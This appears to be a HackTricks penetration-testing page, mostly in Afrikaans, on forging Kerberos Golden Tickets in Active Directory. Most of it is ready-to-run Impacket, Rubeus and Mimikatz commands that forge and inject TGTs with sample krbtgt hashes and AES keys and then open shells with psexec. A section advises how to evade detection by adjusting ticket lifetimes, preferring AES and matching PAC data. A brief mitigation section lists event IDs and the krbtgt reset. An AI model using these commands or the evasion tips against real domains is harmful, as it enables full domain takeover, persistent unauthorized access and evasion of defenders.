# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

’n **Golden Ticket**-aanval bestaan uit die **skepping van ’n wettige Ticket Granting Ticket (TGT) wat enige gebruiker naboots** deur die gebruik van die **NTLM hash van die Active Directory (AD) krbtgt-rekening**. Hierdie tegniek is veral voordelig omdat dit **toegang tot enige diens of masjien** binne die domein as die nagebootste gebruiker moontlik maak. Dit is noodsaaklik om te onthou dat die **krbtgt-rekening se geloofsbriewe nooit outomaties opgedateer word nie**.

Om die **NTLM hash** van die krbtgt-rekening te verkry, kan verskeie metodes gebruik word. Dit kan uit die **Local Security Authority Subsystem Service (LSASS) proses** of die **NT Directory Services (NTDS.dit) lêer** wat op enige Domain Controller (DC) binne die domein geleë is, onttrek word. Verder is **die uitvoer van ’n DCsync-aanval** nog ’n strategie om hierdie NTLM hash te verkry, wat uitgevoer kan word met gereedskap soos die **lsadump::dcsync module** in Mimikatz of die **secretsdump.py script** deur Impacket. Dit is belangrik om te beklemtoon dat om hierdie operasies uit te voer, **domain admin privileges of ’n soortgelyke vlak van toegang tipies vereis word**.

Alhoewel die NTLM hash ’n lewensvatbare metode vir hierdie doel is, word dit **sterk aanbeveel** om tickets te **forge met die Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** vir operasionele sekuriteitsredes. Dit is selfs belangriker in moderne domeine omdat **RC4 usage word uitgefaseer** en baie duideliker in Kerberos telemetry uitstaan.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Moderne ticket crafting notas

Wanneer moontlik, **query LDAP en SYSVOL eerste** en forge dan die ticket met die regte domain policy en user PAC values in plaas daarvan om dit handmatig uit te dink:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` vra die DC vir die gebruiker-, groep-, NetBIOS- en beleidsdata wat gebruik word om ’n meer realistiese PAC te bou.
- `/printcmd` druk ’n offline command line wat die herwonne PAC-velde bevat, wat nuttig is as jy later dieselfde ticket wil forge sonder om weer LDAP te raak.
- `/extendedupndns` voeg die nuwer `UpnDns` PAC-elemente by wat die `samAccountName` en rekening-SID bevat.
- `/oldpac` verwyder die nuwer `Requestor`- en `Attributes` PAC-buffers; dit is hoofsaaklik nuttig vir versoenbaarheidstoetsing teen ouer omgewings, nie vir verstek tradecraft nie.

Van Linux af ondersteun onlangse Impacket weergawes ook die byvoeging van die nuwer PAC-strukture en die instelling van ’n realistiese geldigheidstydperk:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` is in **hours**. Die verstek is **10 years**, wat lawaaierig is.
- `-extra-pac` voeg die nuwer `UPN_DNS` PAC information by.
- `-old-pac` forseer die legacy PAC layout.
- `-extra-sid` is nuttig wanneer die PAC addisionele SIDs nodig het (byvoorbeeld, in child-to-parent escalation scenarios, wat in [SID-History Injection](sid-history-injection.md) gedek word).

**Once** jy die **golden Ticket injected** het, kan jy toegang kry tot die shared files **(C$)**, en services en WMI execute, so jy kan **psexec** of **wmiexec** gebruik om ’n shell te verkry (dit lyk asof jy nie via winrm ’n shell kan kry nie).

### Bypassing common detections

Die mees algemene maniere om ’n golden ticket te detect is om **Kerberos traffic** op die wire te inspekteer. By default, Mimikatz **signs the TGT for 10 years**, wat uitstaan as anomalous in daaropvolgende TGS requests wat daarmee gemaak word.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Gebruik die `/startoffset`, `/endin` en `/renewmax` parameters om die start offset, duration en die maximum renewals te beheer (alles in minute).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Ongelukkig word die TGT se leeftyd nie in 4769's gelog nie, so jy sal hierdie inligting nie in die Windows event logs vind nie. Wat jy wel kan korreleer, is **om 4769's te sien sonder ’n voorafgaande 4768**. Dit is **nie moontlik om ’n TGS sonder ’n TGT aan te vra nie**, en as daar geen rekord is dat ’n TGT uitgereik is nie, kan ons aflei dat dit offline vervals is.

In **nuwer Windows builds** stel Event IDs **4768** en **4769** ook baie beter **encryption type telemetry** bloot. ’n Vervalsde TGT/TGS wat **RC4 (`0x17`)** gebruik in ’n domain waar `krbtgt`, clients en services reeds AES keys het, is baie makliker om op te spoor as ’n paar jaar gelede. Dit is nog ’n rede om **AES-backed Golden Tickets** te verkies en om die domain se normale Kerberos policy so nou as moontlik te laat ooreenstem.

Nog ’n OPSEC-probleem is **PAC fidelity**. Tickets met onmoontlike group memberships, ontbrekende nuwer PAC buffers, of account metadata wat nie met LDAP ooreenstem nie, is makliker om op te spoor wanneer defenders PAC contents teen AD data valideer. As jy ’n TGT nodig het wat lyk asof dit werklik deur ’n DC uitgereik is, hersien:

{{#ref}}
diamond-ticket.md
{{#endref}}

Daar is ook **environmental limits** vir persistence. Die `krbtgt` account hou ’n **password history van 2**, so ’n vervalsde TGT kan geldig bly oor die **eerste** `krbtgt` reset as dit met die vorige key onderteken is. Dit is hoekom defenders Golden Tickets ongeldig maak deur **`krbtgt` twee keer te reset** en minstens die domain se maksimum ticket lifetime tussen resets te wag.

Om hierdie detection te **bypass** check die diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Ander klein truuks wat defenders kan gebruik, is om **waarskuwings te gee op 4769's vir sensitive users** soos die default domain administrator account en om **RC4 usage vir `krbtgt`** te waarsku in domains wat normaalweg AES tickets uitreik.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
